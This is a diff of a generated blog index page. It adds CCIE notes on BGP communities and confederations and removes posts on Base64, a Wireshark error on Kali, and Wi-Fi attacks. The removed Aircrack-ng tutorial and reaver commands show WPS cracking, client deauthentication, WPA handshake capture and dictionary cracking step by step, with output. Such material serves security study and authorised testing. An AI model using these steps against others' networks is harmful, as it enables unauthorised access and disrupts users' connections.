+<p>查看BGP转发表中携带特定团体属性的路由更新<code>show ip bgp community &lt;no-export/no-advertise&gt;</code></p>
+<h3 id="BGP-自定义团体属性标记及策略设置"><a href="#BGP-自定义团体属性标记及策略设置" class="headerlink" title="BGP 自定义团体属性标记及策略设置"></a>BGP 自定义团体属性标记及策略设置</h3><p>自定义团体属性格式：</p>
+<p>AA：NN（AA 是 AS 号，NN 是标记值 0~65440）</p>
+<h4 id="自定义团体属性的配置步骤"><a href="#自定义团体属性的配置步骤" class="headerlink" title="自定义团体属性的配置步骤"></a>自定义团体属性的配置步骤</h4><p>步骤1：更新源处打上标记</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ACL 抓取网络</span><br><span class="line">!</span><br><span class="line">route-map &lt;name&gt; permit &lt;10&gt;</span><br><span class="line">match ip add &lt;acl-id&gt;</span><br><span class="line">set community &lt;aa:nn&gt;</span><br><span class="line">!</span><br><span class="line">router bgp &lt;as-id&gt;</span><br><span class="line">neighbor &lt;peer-id&gt; route-map &lt;name&gt; &lt;in/out&gt;</span><br><span class="line">neighbor &lt;peer-id&gt; send-community</span><br></pre></td></tr></table></figure>
+<p>步骤2：在更新接收者匹配团体属性，并且定义不同的策略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip community-list &lt;id&gt; permit &lt;aa:nn&gt; //团体属性列表，匹配特定团体属性更新</span><br><span class="line">route-map &lt;name&gt; permit 10</span><br><span class="line">match community &lt;id&gt;</span><br><span class="line">set &lt;策略&gt;</span><br><span class="line">router bgp 1</span><br><span class="line">neighbor &lt;peer-id&gt; route-map &lt;name&gt; &lt;in/out&gt;</span><br></pre></td></tr></table></figure>
+<p>所有需要传递团体属性的路由器都需要录入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip bgp-community new-format</span><br><span class="line">router bgp 1</span><br><span class="line">neighbor &lt;peer-add&gt; send-community</span><br></pre></td></tr></table></figure>
+<h3 id="BGP-联邦"><a href="#BGP-联邦" class="headerlink" title="BGP 联邦"></a>BGP 联邦</h3><p>把多个 AS 融入到一个联邦中，联邦中不同 AS 的路径信息，不会泄露出去。</p>
+<p>联邦内所有设备必须声明联邦号，联邦内 eBGP 还要声明是联邦内 eBGP peer。</p>
+<p><code>bgp confederation identifier 234</code></p>
+<p><code>bgp confederation peer 4</code></p>
+<h3 id="BGP-知识点"><a href="#BGP-知识点" class="headerlink" title="BGP 知识点"></a>BGP 知识点</h3><p>BGP 同步，BGP 下一跳判断。</p>
+<p>BGP eBGP peer 多跳</p>
+<p>BGP 选路原则、利用 route-map 影响</p>
+<p>BGP 的汇总 summary-only as-set</p>
+<p>BGP 的团体属性</p>
+<p>BGP 的过滤</p>
+<p>BGP 路由反射器</p>
+<p>BGP 联邦</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CCIE/">CCIE</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCIE/">CCIE</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-C_C++/Concept_gcc/gcc_gdb备忘录" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1161,442 +1748,9 @@
 
 
   
-    <article id="post-Backend/base64原理" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/04/24/Backend/base64原理/" class="article-date">
-      <time datetime="2018-04-23T16:37:54.000Z" itemprop="datePublished">2018-04-24</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/24/Backend/base64原理/">Base64原理</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>　　开发者对Base64编码肯定很熟悉，是否对它有很清晰的认识就不一定了。实际上Base64已经简单到不能再简单了，如果对它的理解还是模棱两可实在不应该。大概介绍一下Base64的相关内容，花几分钟时间就可以彻底理解它。文章下边贴了一个Base64的编解码器，方便阅读文章的同时来实验。</p>
-<p>　　<strong>一. Base64编码由来</strong></p>
-<p>　　为什么会有Base64编码呢？因为有些网络传送渠道并不支持所有的字节，例如传统的邮件只支持可见字符的传送，像ASCII码的<strong>控制字符</strong>就不能通过邮件传送。这样用途就受到了很大的限制，比如图片二进制流的每个字节不可能全部是可见字符，所以就传送不了。最好的方法就是在不改变传统协议的情况下，做一种扩展方案来支持二进制文件的传送。把不可打印的字符也能用可打印字符来表示，问题就解决了。Base64编码应运而生，Base64就是一种基于64个可打印字符来表示二进制数据的表示方法。</p>
-<p>　　<strong>二. Base64编码原理</strong></p>
-<p>　　看一下Base64的索引表，字符选用了”A-Z、a-z、0-9、+、/“ 64个可打印字符。数值代表字符的索引，这个是标准Base64协议规定的，不能更改。64个字符用6个bit位就可以全部表示，一个字节有8个bit位，剩下两个bit就浪费掉了，这样就不得不牺牲一部分空间了。这里需要弄明白的就是一个Base64字符是8个bit，但是有效部分只有右边的6个bit，左边两个永远是0。</p>
-<p><img src="https://images0.cnblogs.com/blog/238451/201408/291137095326660.png" alt="img"></p>
-<p>　　那么怎么用6个有效bit来表示传统字符的8个bit呢？8和6的最小公倍数是24，也就是说3个传统字节可以由4个Base64字符来表示，保证有效位数是一样的，这样就多了1/3的字节数来弥补Base64只有6个有效bit的不足。你也可以说用两个Base64字符也能表示一个传统字符，但是采用最小公倍数的方案其实是最减少浪费的。结合下边的图比较容易理解。Man是三个字符，一共24个有效bit，只好用4个Base64字符来凑齐24个有效位。红框表示的是对应的Base64，6个有效位转化成相应的索引值再对应Base64字符表，查出”Man”对应的Base64字符是”TWFU”。说到这里有个原则不知道你发现了没有，要转换成Base64的<strong>最小单位就是三个字节</strong>，对一个字符串来说每次都是三个字节三个字节的转换，对应的是Base64的四个字节。这个搞清楚了其实就差不多了。</p>
-<p><img src="https://images0.cnblogs.com/blog/238451/201408/291153483606946.png" alt="img">         <img src="https://images0.cnblogs.com/blog/238451/201408/291429131888725.png" alt="img"></p>
-<p>　　但是转换到最后你发现不够三个字节了怎么办呢？愿望终于实现了，我们可以用两个Base64来表示一个字符或用三个Base64表示两个字符，像下图的A对应的第二个Base64的二进制位只有两个，把后边的四个补0就是了。所以A对应的Base64字符就是QQ。上边已经说过了，原则是Base64字符的<strong>最小单位是四个字符一组</strong>，那这才两个字符，后边补两个”=”吧。其实不用”=”也不耽误解码，之所以用”=”，可能是考虑到多段编码后的Base64字符串拼起来也不会引起混淆。由此可见Base64字符串只可能最后出现一个或两个”=”，中间是不可能出现”=”的。下图中字符”BC”的编码过程也是一样的。</p>
-<p><img src="https://images0.cnblogs.com/blog/238451/201408/291217167983928.png" alt="img"></p>
-<p>　　<strong>三. 总结</strong>　　</p>
-<p>　　说起Base64编码可能有些奇怪，因为大多数的编码都是由字符转化成二进制的过程，而从二进制转成字符的过程称为解码。而Base64的概念就恰好反了，由二进制转到字符称为编码，由字符到二进制称为解码。</p>
-<p>　　Base64编码主要用在传输、存储、表示二进制等领域，还可以用来加密，但是这种加密比较简单，只是一眼看上去不知道什么内容罢了，当然也可以对Base64的字符序列进行定制来进行加密。</p>
-<p>　　Base64编码是从二进制到字符的过程，像一些中文字符用不同的编码转为二进制时，产生的二进制是不一样的，所以最终产生的Base64字符也不一样。例如”上网”对应utf-8格式的Base64编码是”5LiK572R”，对应GB2312格式的Base64编码是”yc/N+A==”。</p>
-<p>文章参考自 “<a href="http://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">维基百科-Base64</a>“</p>
-<h3 id="url-safe-base64"><a href="#url-safe-base64" class="headerlink" title="url safe base64"></a>url safe base64</h3><p>在上面的base64传统编码中会出现+, /两个会被url直接转义的符号，因此如果希望通过url传输这些编码字符串，我们</p>
-<p>需要先做传统base64编码，随后将+和/分别替换为- _两个字符，在接收端则做相反的动作解码</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Backend/">Backend</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/base64/">base64</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Security/无线安全/reaver" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/04/18/Security/无线安全/reaver/" class="article-date">
-      <time datetime="2018-04-18T08:02:06.000Z" itemprop="datePublished">2018-04-18</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/18/Security/无线安全/reaver/">reaver</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="扫描使用wps的Wi-Fi"><a href="#扫描使用wps的Wi-Fi" class="headerlink" title="扫描使用wps的Wi-Fi"></a>扫描使用wps的Wi-Fi</h3><p><code>wash -i en0</code></p>
-<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p><code>reaver -i en0 [-b mac] -vv [-c channel]</code></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Security/">Security</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Security/无线安全/wireshark fatal IO error 2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/04/15/Security/无线安全/wireshark fatal IO error 2/" class="article-date">
-      <time datetime="2018-04-15T06:23:44.000Z" itemprop="datePublished">2018-04-15</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/15/Security/无线安全/wireshark fatal IO error 2/">kali vnc wireshark fatal IO error 2</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><em># wireshark</em></p>
-<p>failed to get the current screen resources<br>The X11 connection broke: I/O error (code 1)<br>XIO: fatal IO error 2 (No such file or directory) on X server “localhost:10.0”<br>after 349 requests (349 known processed) with 0 events remaining.</p>
-<p>Try using wireshark-gtk by installing</p>
-<p><em># apt install wireshark-gtk</em></p>
-<p>Now just run </p>
-<p><em># wireshark-gtk</em></p>
-<p>No errors. If you continue to get errors please comment below.</p>
-<p>source : <a href="https://www.linuxsecrets.com/discussions/9991-the-x11-connection-broke-i-o-error-code-1" target="_blank" rel="noopener">https://www.linuxsecrets.com/discussions/9991-the-x11-connection-broke-i-o-error-code-1</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Security/">Security</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wireshark/">Wireshark</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Security/无线安全/Aircrack-ng" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/04/15/Security/无线安全/Aircrack-ng/" class="article-date">
-      <time datetime="2018-04-15T06:22:08.000Z" itemprop="datePublished">2018-04-15</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/15/Security/无线安全/Aircrack-ng/">Aircrack-ng</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="How-a-wireless-network-is-found"><a href="#How-a-wireless-network-is-found" class="headerlink" title="How a wireless network is found"></a>How a wireless network is found</h2><p>This is a short introduction into managed networks, these ones working with Access Points (AP). Every AP sends out about 10 so called beacon frames a second. These packets contain the following information:</p>
-<ul>
-<li>Name of the network (ESSID)</li>
-<li>If encryption is used (and what encryption is used; pay attention, that may not be always true just because the AP advertises it)</li>
-<li>What MBit data rates are supported</li>
-<li>Which channel the network is on</li>
-</ul>
-<p>This information is then shown in your tool that connects to this network. It is shown when you let your card scan for networks with <strong>iwlist <interface> scan</interface></strong> and when you run <a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a>.</p>
-<h2 id="Discovering-Networks"><a href="#Discovering-Networks" class="headerlink" title="Discovering Networks"></a>Discovering Networks</h2><p>The first thing to do is looking out for a potential target. The aircrack-ng suite contains <a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> for this - but other programs like<a href="http://www.kismetwireless.net/" target="_blank" rel="noopener">Kismet</a> can be used too.</p>
-<p>Prior to looking for networks, you must put your wireless card into what is called “monitor mode”. Monitor mode is a special mode that allows your PC to listen to every wireless packet. This monitor mode also allows you to optionally inject packets into a network. Injection will be covered later in this tutorial.</p>
-<p>To put your wireless card into monitor mode:</p>
-<p><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng</a> start rausb0</p>
-<p>To confirm it is in monitor mode, run “iwconfig” and confirm the mode. The <a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng page</a> on the Wiki has generic information and how to start it for other drivers.</p>
-<p>Then, start airodump-ng to look out for networks:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng rausb0</span><br></pre></td></tr></table></figure>
-<p>“rausb0” is the network interface (nic) name. If you are using a different WLAN device than a rt2570 you’ll have to use a different nic name. Take a look in the documentation of the nic driver. For most newer drivers, the primary interface name is “wlan0”, but for monitoring, a secondary interface (“mon0”, created when you run airmon-ng) is used.</p>
-<p>If airodump-ng could connect to the WLAN device, you’ll see a screen like this:</p>
-<p><a href="http://www.aircrack-ng.org/lib/exe/fetch.php?tok=23e9a2&amp;media=http%3A%2F%2Fwww.aircrack-ng.org%2Fimg%2Fnewbie_airodump.png" target="_blank" rel="noopener"><img src="http://www.aircrack-ng.org/lib/exe/fetch.php?tok=23e9a2&amp;media=http%3A%2F%2Fwww.aircrack-ng.org%2Fimg%2Fnewbie_airodump.png" alt="img"></a></p>
-<p><a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> hops from channel to channel and shows all access points it can receive beacons from. Channels 1 to 14 are used for 802.11b and g (in US, they only are allowed to use 1 to 11; 1 to 13 in Europe with some special cases; 1-14 in Japan). Channels between 36 and 149 are used for 802.11a. The current channel is shown in the top left corner.</p>
-<p>After a short time some APs and (hopefully) some associated clients will show up.</p>
-<p>The upper data block shows the access points found:</p>
-<table>
-<thead>
-<tr>
-<th>BSSID</th>
-<th>The MAC address of the AP</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>PWR</td>
-<td>Signal strength. Some drivers don’t report it</td>
-</tr>
-<tr>
-<td>Beacons</td>
-<td>Number of beacon frames received. If you don’t have a signal strength you can estimate it by the number of beacons: the more beacons, the better the signal quality</td>
-</tr>
-<tr>
-<td>Data</td>
-<td>Number of data frames received</td>
-</tr>
-<tr>
-<td>CH</td>
-<td>Channel the AP is operating on</td>
-</tr>
-<tr>
-<td>MB</td>
-<td>Speed or AP Mode. 11 is pure 802.11b, 54 pure 802.11g. Values between are a mixture</td>
-</tr>
-<tr>
-<td>ENC</td>
-<td>Encryption: OPN: no encryption, WEP: WEP encryption, WPA: WPA or WPA2 encryption, WEP?: WEP or WPA (don’t know yet)</td>
-</tr>
-<tr>
-<td>ESSID</td>
-<td>The network name. Sometimes hidden</td>
-</tr>
-</tbody>
-</table>
-<p>The lower data block shows the clients found:</p>
-<table>
-<thead>
-<tr>
-<th>BSSID</th>
-<th>The MAC of the AP this client is associated to</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>STATION</td>
-<td>The MAC of the client itself</td>
-</tr>
-<tr>
-<td>PWR</td>
-<td>Signal strength. Some drivers don’t report it</td>
-</tr>
-<tr>
-<td>Packets</td>
-<td>Number of data frames received</td>
-</tr>
-<tr>
-<td>Probes</td>
-<td>Network names (ESSIDs) this client has probed</td>
-</tr>
-</tbody>
-</table>
-<p>Now you should look out for a target network. It should have a client connected because cracking networks without a client is an advanced topic (See <a href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients" target="_blank" rel="noopener">How to crack wep with no clients</a>). It should use WEP encryption and have a high signal strength. Maybe you can re-position your antenna to get a better signal. Often a few centimeters make a big difference in signal strength.</p>
-<p>In the example above the net 00:01:02:03:04:05 would be the only possible target because it’s the only one with an associated client. But it also has a high signal strength so it’s really a good target to practice.</p>
-<h2 id="Injection-test"><a href="#Injection-test" class="headerlink" title="Injection test"></a>Injection test</h2><h3 id="Basic-Test"><a href="#Basic-Test" class="headerlink" title="Basic Test"></a>Basic Test</h3><p>This is a basic test to determine if you card successfully supports injection.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -9 wlan0</span><br></pre></td></tr></table></figure>
-<p>The system responds:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">16:29:41  wlan0 channel: 9</span><br><span class="line">16:29:41  Trying broadcast probe requests...</span><br><span class="line">16:29:41  Injection is working!</span><br><span class="line">16:29:42  Found 5 APs</span><br><span class="line"></span><br><span class="line">16:29:42  Trying directed probe requests...</span><br><span class="line">16:29:42  00:09:5B:5C:CD:2A - channel: 11 - &apos;NETGEAR&apos;</span><br><span class="line">16:29:48  0/30: 0%</span><br><span class="line">16:29:48  00:14:BF:A8:65:AC - channel: 9 - &apos;title&apos;</span><br><span class="line">16:29:54  0/30: 0%</span><br><span class="line">16:29:54  00:14:6C:7E:40:80 - channel: 9 - &apos;teddy&apos;</span><br><span class="line">16:29:55  Ping (min/avg/max): 2.763ms/4.190ms/8.159ms</span><br><span class="line">16:29:55  27/30: 90%</span><br><span class="line">16:29:55  00:C0:49:E2:C4:39 - channel: 11 - &apos;mossy&apos;</span><br><span class="line">16:30:01  0/30: 0%</span><br><span class="line">16:30:01  00:0F:66:C3:14:4E - channel: 9 - &apos;tupper&apos;</span><br><span class="line">16:30:07  0/30: 0%</span><br></pre></td></tr></table></figure>
-<p>Analysis of the response:</p>
-<ul>
-<li><strong>16:29:41 wlan0 channel: 9</strong>: This tells you which interface was used and the channel it was running on.</li>
-<li><strong>16:29:41 Injection is working!</strong>: This confirms your card can inject.</li>
-<li><strong>16:29:42 Found 5 APs</strong>: These access points (APs) were found either through the broadcast probes or received beacons.</li>
-<li><strong>16:29:42 00:09:5B:5C:CD:2A - channel: 11 - ‘NETGEAR’</strong>: Notice that this AP is on channel 11 and not on our card channel of 9. It is common for adjacent channels to spill over.</li>
-<li><strong>16:29:55 Ping (min/avg/max): 2.763ms/4.190ms/8.159ms</strong>: It an AP responds with one or more packets then the ping times are calculated.</li>
-<li><strong>16:29:55 27/30: 90%</strong> for teddy: This is the only AP that the card can successfully communicate with. This is another verification that your card can inject. You will also notice that all the other APs have 0%.</li>
-</ul>
-<h3 id="Hidden-or-Specific-SSID"><a href="#Hidden-or-Specific-SSID" class="headerlink" title="Hidden or Specific SSID"></a>Hidden or Specific SSID</h3><p>You can check a hidden SSID or check a specific SSID with the following command:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --test -e teddy -a 00:14:6C:7E:40:80 ath0</span><br></pre></td></tr></table></figure>
-<p>The system responds:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">11:01:06  ath0 channel: 9</span><br><span class="line">11:01:06  Trying broadcast probe requests...</span><br><span class="line">11:01:06  Injection is working!</span><br><span class="line">11:01:07  Found 1 APs</span><br><span class="line"></span><br><span class="line">11:01:07  Trying directed probe requests...</span><br><span class="line">11:01:07  00:14:6C:7E:40:80 - channel: 9 - &apos;teddy&apos;</span><br><span class="line">11:01:07  Ping (min/avg/max): 2.763ms/4.190ms/8.159ms</span><br><span class="line">11:01:07  30/30: 100%</span><br></pre></td></tr></table></figure>
-<h2 id="Start-airodump-ng-to-collect-authentication-handshake"><a href="#Start-airodump-ng-to-collect-authentication-handshake" class="headerlink" title="Start airodump-ng to collect authentication handshake"></a>Start airodump-ng to collect authentication handshake</h2><p>The purpose of this step is to run airodump-ng to capture the 4-way authentication handshake for the AP we are interested in. </p>
-<p>Enter:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0</span><br></pre></td></tr></table></figure>
-<p>Where:</p>
-<ul>
-<li>-c 9 is the channel for the wireless network</li>
-<li>-<code></code>-bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminates extraneous traffic.</li>
-<li>-w psk is the file name prefix for the file which will contain the IVs.</li>
-<li>ath0 is the interface name.</li>
-</ul>
-<p>Important: Do NOT use the “-<code></code>-ivs” option. You must capture the full packets.</p>
-<p>Here what it looks like if a wireless client is connected to the network:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80</span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</span><br><span class="line">                                                                                                             </span><br><span class="line">00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy                           </span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              STATION            PWR  Lost  Packets  Probes                                             </span><br><span class="line">                                                                                                             </span><br><span class="line">00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116</span><br></pre></td></tr></table></figure>
-<p>In the screen above, notice the “WPA handshake: 00:14:6C:7E:40:80” in the top right-hand corner. This means airodump-ng has successfully captured the four-way handshake.</p>
-<p>Here it is with no connected wireless clients:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CH  9 ][ Elapsed: 4 s ][ 2007-03-24 17:51 </span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</span><br><span class="line">                                                                                                             </span><br><span class="line">00:14:6C:7E:40:80   39 100       51        0    0   9  54  WPA2 CCMP   PSK  teddy                           </span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              STATION            PWR  Lost  Packets  Probes</span><br></pre></td></tr></table></figure>
-<h2 id="Use-aireplay-ng-to-deauthenticate-the-wireless-client"><a href="#Use-aireplay-ng-to-deauthenticate-the-wireless-client" class="headerlink" title="Use aireplay-ng to deauthenticate the wireless client"></a>Use aireplay-ng to deauthenticate the wireless client</h2><p>This step is optional. If you are patient, you can wait until airodump-ng captures a handshake when one or more clients connect to the AP. You only perform this step if you opted to actively speed up the process. The other constraint is that there must be a wireless client currently associated with the AP. If there is no wireless client currently associated with the AP, then you have to be patient and wait for one to connect to the AP so that a handshake can be captured. Needless to say, if a wireless client shows up later and airodump-ng did not capture the handshake, you can backtrack and perform this step.</p>
-<p>This step sends a message to the wireless client saying that that it is no longer associated with the AP. The wireless client will then hopefully reauthenticate with the AP. The reauthentication is what generates the 4-way authentication handshake we are interested in collecting. This is what we use to break the WPA/WPA2 pre-shared key.</p>
-<p>Based on the output of airodump-ng in the previous step, you determine a client which is currently connected. You need the MAC address for the following. Open another console session and enter:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0</span><br></pre></td></tr></table></figure>
-<p>Where:</p>
-<ul>
-<li>-0 means deauthentication</li>
-<li>1 is the number of deauths to send (you can send multiple if you wish)</li>
-<li>-a 00:14:6C:7E:40:80 is the MAC address of the access point</li>
-<li>-c 00:0F:B5:FD:FB:C2 is the MAC address of the client you are deauthing</li>
-<li>ath0 is the interface name</li>
-</ul>
-<p>Here is what the output looks like:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11:09:28  Sending DeAuth to station   -- STMAC: [00:0F:B5:34:30:30]</span><br></pre></td></tr></table></figure>
-<p>With luck this causes the client to reauthenticate and yield the 4-way handshake.</p>
-<h2 id="Run-aircrack-ng-to-crack-the-pre-shared-key"><a href="#Run-aircrack-ng-to-crack-the-pre-shared-key" class="headerlink" title="Run aircrack-ng to crack the pre-shared key"></a>Run aircrack-ng to crack the pre-shared key</h2><p>The purpose of this step is to actually crack the WPA/WPA2 pre-shared key. To do this, you need a dictionary of words as input. Basically, aircrack-ng takes each word and tests to see if this is in fact the pre-shared key.</p>
-<p>There is a small dictionary that comes with aircrack-ng - “password.lst”. This file can be found in the “test” directory of the aircrack-ng source code. The <a href="http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists" target="_blank" rel="noopener">Wiki FAQ</a> has an extensive list of dictionary sources. You can use <a href="http://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a> (JTR) to generate your own list and pipe them into <a href="http://www.aircrack-ng.org/doku.php?id=aircrack-ng" target="_blank" rel="noopener">aircrack-ng</a>. Using JTR in conjunction with aircrack-ng is beyond the scope of this tutorial.</p>
-<p>Open another console session and enter:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap</span><br></pre></td></tr></table></figure>
-<p>Where:</p>
-<ul>
-<li>-w password.lst is the name of the dictionary file. Remember to specify the full path if the file is not located in the same directory.</li>
-<li><em>.cap is name of group of files containing the captured packets. Notice in this case that we used the wildcard </em> to include multiple files.</li>
-</ul>
-<p>Here is typical output when there are no handshakes found:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Opening psk-01.cap</span><br><span class="line">Opening psk-02.cap</span><br><span class="line">Opening psk-03.cap</span><br><span class="line">Opening psk-04.cap</span><br><span class="line">Read 1827 packets.</span><br><span class="line"></span><br><span class="line">No valid WPA handshakes found.</span><br></pre></td></tr></table></figure>
-<p>When this happens you either have to redo step 3 (deauthenticating the wireless client) or wait longer if you are using the passive approach. When using the passive approach, you have to wait until a wireless client authenticates to the AP.</p>
